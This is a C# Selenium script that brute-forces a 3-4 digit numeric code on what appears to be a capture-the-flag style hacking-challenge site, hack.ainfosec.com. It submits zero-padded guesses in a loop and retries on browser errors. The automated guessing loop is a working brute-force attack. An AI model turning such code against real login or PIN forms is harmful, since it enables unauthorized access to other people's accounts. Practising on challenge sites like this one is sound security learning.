using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using NUnit.Framework;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;

namespace SeleniumTests
{ 
    class BruteForceHack
    {
        /*
         * Brute force hack the site!
         * enter starting number
         */
        static void Main(string[] args)
        {
            //Establish Driver
            IWebDriver driver = new ChromeDriver();
            driver.Navigate().GoToUrl("https://hack.ainfosec.com/");
            Actions action = new Actions(driver);
            Console.WriteLine("Type starting digit");
            int guess = Int32.Parse(Console.ReadLine());

            //try to enter a previously given ID number
            //driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(25);
            //IWebElement idBox = driver.FindElement(By.XPath("/html/body/site-nav/div/nav/div/div/ul/li[2]/div/div/button"));
            //idBox.Click();
            //driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
            //idBox = driver.FindElement(By.XPath("/html/body/site-help-modal/div/div/div/div[2]/resume-session-form/div/input"));
            //idBox.SendKeys("da75ef96-c012-47b3-902f-19b766b015f4");
            //idBox.SendKeys(Keys.Enter);

            //navigate to the brute force exercise
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(25);
            IWebElement bruteForceIcon = driver.FindElement(By.XPath("//challenge-list[@id='hackerchallenge-challenge-list']/div[3]/div/challenge-card/div/div/div/div[2]/div/button"));
            action.MoveToElement(bruteForceIcon).Perform();
            bruteForceIcon.Click();
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(25);


            //password can be 3-4 digits numerical only
            do
            {
                try
                {


                    //Click into the input field
                    IWebElement inputBox = driver.FindElement(By.XPath("/html/body/div[3]/div[4]/challenge-list/div[3]/div/challenge-card[1]/challenge-modal/div/div/div/div[2]/div[2]/div/input"));
                    IWebElement submit = driver.FindElement(By.XPath("/html/body/div[3]/div[4]/challenge-list/div[3]/div/challenge-card[1]/challenge-modal/div/div/div/div[3]/button"));
                    String guessString = guess.ToString();
                    if (guessString.Length ==1)
                    {
                        guessString = "00" + guessString;
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = guess.ToString();
                        guessString = "000" + guessString;
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = guess.ToString();
                    }

                    if (guessString.Length == 2)
                    {
                        guessString = "0" + guessString;
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = guess.ToString();
                        guessString = "00" + guessString;
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = guess.ToString();
                    }

                    if (guessString.Length == 3)
                    {
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = "0" + guessString;
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);

                        guessString = guess.ToString();
                    }

                    if (guessString.Length == 4)
                    {
                        inputBox.Clear();
                        inputBox.SendKeys(guessString);
                        submit.Click();
                        System.Threading.Thread.Sleep(250);
                   
                        guessString = guess.ToString();
                    }

                    guess++;
                }
                catch (StaleElementReferenceException e)
                {
                    Console.WriteLine("Stale Element.. Retrying");
                }
                catch(ElementNotInteractableException e)
                {
                    Console.WriteLine("Element Not Interactable.. Retrying");
                }
                catch (WebDriverException e)
                {
                    Console.WriteLine("WebDriverException.. Retrying");
                }

            }
            while (guess < 10000);

        }
    }
}
